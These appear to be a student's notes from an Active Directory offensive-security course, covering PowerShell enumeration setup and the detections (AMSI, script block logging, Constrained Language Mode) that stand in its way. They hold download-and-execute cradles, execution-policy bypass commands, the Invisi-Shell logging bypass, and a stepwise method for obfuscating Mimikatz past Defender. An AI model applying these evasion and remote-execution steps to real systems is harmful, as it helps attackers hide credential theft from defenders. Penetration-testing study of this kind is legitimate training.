course relies on PowerShell heavily for enumeration


# Scripts and Modules

load a PowerShell script
`C:\AD\Tools\PowerView.ps1`

import a script 
`Import-Module C:\AD\Tools\script.psd1`

List commands of a module
`Get-Command -Module <modulename>`

download execute cradle
`iex (New-Object Net.WebClient).DownloadString('<url>')`
`iex (iwr '<url>')`
- if above doesn't work, try these
![[Pasted image 20260111012432.png]]
![[Pasted image 20260111012441.png]]





# PowerShell Detections

- system-wide transcription - not enabled by default
	- everyone on the system can see transcriptions for PowerShell
- script block logging - enabled by default
	- blocks suspicious script executions
- AntiMalware Scan Interface (AMSI)
	- when running a script, AMSI sends the script to malware scanner before execution
- Constrained Language Mode (CLM) - integrated with Applocker and WDAC (Device Guard)
	- AD-Module is the only module in the course that works with CLM enabled



# Execution Policy

- NOT a security measure, it is present to prevent users from accidentally executing scripts
- several ways to bypass:
`powershell -ExecutionPolicy bypass`
`powershell -c <cmd>`
`powershell -encodedcommand`
`$env:PSExecutionPolicyPreference="bypass"`


# Bypassing PowerShell Security

[Invisi-Shell](https://github.com/OmerYa/Invisi-Shell)
- hooks .NET assemblies to bypass logging
- uses a CLR Profiler API to perform hook
- Common Language Runtime (CLR) - DLL that has functions that receive messages from and send messages to the CLR using profiling API
	- profiler DLL loaded by CLR at runtime


# Invisi-Shell

With admin privileges
`RunWithPathAsAdmin.bat`

With non-admin privileges
`RunWithRegistryNonAdmin.bat`

need to exit new PowerShell session to complete cleanup



# Bypass AV Signatures for PowerShell

load scripts in memory and avoid detection using AMSI bypass
- the following tools can be used to search for signatures that Defender will flag
	- [AMSITrigger](https://github.com/RythmStick/AMSITrigger)
	- [DefenderCheck](https://github.com/t3hbb/DefenderCheck)

Simply provide path to the script file to scan it
`AmsiTrigger_x64.exe -i C:\AD\Tools\<script>`
`DefenderCheck.exe <script>`

For full obfuscation of PowerShell scripts, see [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
- course will go further in detail later


## Steps to Avoid Signature-Based Detections

1. Scan using AMSITrigger
2. Modify the detected code snippet
3. Rescan using AMSITrigger
4. Repeat 2 & 3 till we get `AMSI_RESULT_NOT_DETECTED` or `Blank`

### Example

![[Pasted image 20260111014143.png]]
- AMSI had a problem with Net.Sockets 
![[Pasted image 20260111014208.png]]
- simply reverse the string and it may come back clean


can also just use parts of the script
- i.e. PowerUp - has a lot of functionality, but you can get away with only certain parts


in their student VM, you can use ByteToLineNumber.ps1 for troubleshooting and finding the problematic code
![[Pasted image 20260111014422.png]]
![[Pasted image 20260111014430.png]]
![[Pasted image 20260111014443.png]]
- in this specific case, PowerUp has a module for dropping a binary, which is what got detected
	- can simply get rid of the binary


### Bypassing AV Signatures for Mimikatz

1. remove default comments
2. rename the script, function names, and variables
3. modify the variable names of Win32 API calls that are detected
4. obfuscate PEBytes content -> PowerKatz dll using packers
5. implement a reverse function for PEBytes to avoid static signatures
6. add sandbox check to waste dynamic analysis resources
7. remove reflected PE warnings for clean output
8. use obfuscated commands for Invoke-MimiEx execution
9. analysis using DefenderCheck